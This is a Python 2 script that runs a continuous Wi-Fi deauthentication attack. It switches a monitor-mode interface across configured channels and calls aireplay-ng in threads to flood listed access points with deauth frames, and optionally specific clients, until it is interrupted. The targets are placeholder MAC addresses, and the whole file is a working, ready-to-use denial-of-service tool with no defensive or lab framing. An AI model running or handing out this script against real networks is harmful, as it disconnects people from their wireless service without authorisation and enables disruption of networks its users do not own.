#!/usr/bin/env python

####################################################################
####################################################################

mon_iface="wlan0mon"

bd_number="10"			
bc_number="10"


# 	Type one attack for line in this way:	"channel_ap" or "channel_ap_client"
# 	1_AA:AA:AA:AA:AA:AA
#	1_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC
#  	2_AA:AA:AA:AA:AA:AA
#	30_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC


target = '''

1_AA:AA:AA:AA:AA:AA
1_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC

2_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC
56_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC

'''


####################################################################
####################################################################
import os
import threading
import sys
import subprocess


def broadcast_deauth (ch, bssid):
	command = "aireplay-ng -0 " + bd_number + " -a " + bssid + " " + mon_iface + " -D &>/dev/null"

	proc = subprocess.Popen(command, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout, stderr = proc.communicate()

	ec = proc.wait()

	if ec == 0:
		print "\033[0;32m[*] CH: " + str(ch) + " DB: " + bssid + "\033[0m"
	else:
		print "\033[0;31m[*] CH: " + str(ch) + " DB: " + bssid + "\033[0m"


	#"&>/dev/null"


def client_deauth (ch, bssid, client):
	command = "aireplay-ng -0 " + bd_number + " -a " + bssid + " -c " + client + " " + mon_iface + " -D &>/dev/null"

	proc = subprocess.Popen(command, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout, stderr = proc.communicate()

	ec = proc.wait()

	if ec == 0:
		print "\033[0;32m[*] CH: " + str(ch) + " DC: " + bssid + " <-- " + client + "\033[0m"
	else:
		print "\033[0;31m[*] CH: " + str(ch) + " DC: " + bssid + " <-- " + client + "\033[0m"


####################################################################

targets = []
queue = []

for i in target.split("\n"):
	if len(i) > 1:
		targets.append(i)

for i in range (0,400):
	queue.append ([i])

for t in targets:
	x = t.split("_")
	ch = int(x[0])
	try: queue[ch].append (x[1] + "_" + x[2])
	except: queue[ch].append (x[1])

run = True

try:
	while run:
		for row in queue:
			if len(row) > 1:

				ch = row[0]
				#row.pop(0)

				command = "iw dev " + mon_iface + " set channel " + str(ch)
				proc = subprocess.Popen(command, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
				stdout, stderr = proc.communicate()
				print "\n[*] Switch to channel: " + str(ch)
				

				threads = []

				for e in row:
					if (run) and (type(e) is str):

						t = e.split ("_")
						if len(t) == 1:
							t = threading.Thread(target=broadcast_deauth, args=(ch, t[0],))
							t.start()
							threads.append (t)
							
						else:
							t = threading.Thread(target=client_deauth, args=(ch, t[0], t[1],))
							t.start()
							threads.append (t)

				for tt in threads:
					tt.join()


except (KeyboardInterrupt, SystemExit):
	run = False
	print "\n\n[*] Stopping all thread..."

print "[*] Gracefully quit"
sys.exit (0)
